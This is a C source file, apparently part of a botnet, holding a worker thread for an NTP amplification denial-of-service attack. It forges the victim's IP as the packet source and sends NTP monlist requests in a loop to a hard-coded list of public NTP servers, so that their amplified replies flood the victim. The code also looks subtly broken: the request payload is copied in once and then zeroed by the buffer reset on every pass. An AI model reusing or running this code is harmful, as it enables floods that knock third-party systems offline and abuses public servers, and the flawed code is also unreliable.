#include "../../../include/botnet.h"
#include "../../../include/compat/raw_structs.h" // ¡LA SOLUCIÓN DEFINITIVA!

// A small list of public NTP servers (many are patched, but some may still respond)
const char *ntp_servers[] = {"64.113.32.5", "128.138.140.44", "131.188.3.220", "192.5.41.41"};
const int num_ntp_servers = sizeof(ntp_servers) / sizeof(char *);

// Externally defined checksum function from dns_amp.c
unsigned short csum(unsigned short *ptr, int nbytes);

// The worker thread for NTP amplification
void *ntp_amp_worker(void *args) {
    struct target *victim = (struct target *)args;
    int sock;
    char datagram[4096];
    // Usamos nuestras propias estructuras con nombres únicos
    struct my_iphdr *iph = (struct my_iphdr *)datagram;
    struct my_udphdr *udph = (struct my_udphdr *)(datagram + sizeof(struct my_iphdr));
    char *payload = (char *)(datagram + sizeof(struct my_iphdr) + sizeof(struct my_udphdr));

    char ntp_payload[] = {0x17, 0x00, 0x03, 0x2a, 0x00, 0x00, 0x00, 0x00};
    memcpy(payload, ntp_payload, sizeof(ntp_payload));

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return NULL; }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { perror("setsockopt"); close(sock); return NULL; }

    struct sockaddr_in sin;
    while (attack_running) {
        for (int j = 0; j < num_ntp_servers; j++) {
            sin.sin_family = AF_INET;
            sin.sin_port = htons(123);
            sin.sin_addr.s_addr = inet_addr(ntp_servers[j]);

            memset(datagram, 0, 4096);

            iph->ihl = 5; iph->version = 4; iph->tos = 0;
            iph->tot_len = sizeof(struct my_iphdr) + sizeof(struct my_udphdr) + sizeof(ntp_payload);
            iph->id = htonl(rand()); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_UDP;
            iph->saddr = victim->addr;
            iph->daddr = sin.sin_addr.s_addr;

            udph->source = htons(rand());
            udph->dest = htons(123);
            udph->len = htons(sizeof(struct my_udphdr) + sizeof(ntp_payload));
            udph->check = 0;

            iph->check = csum((unsigned short *)datagram, iph->tot_len);

            sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(sock);
    return NULL;
}
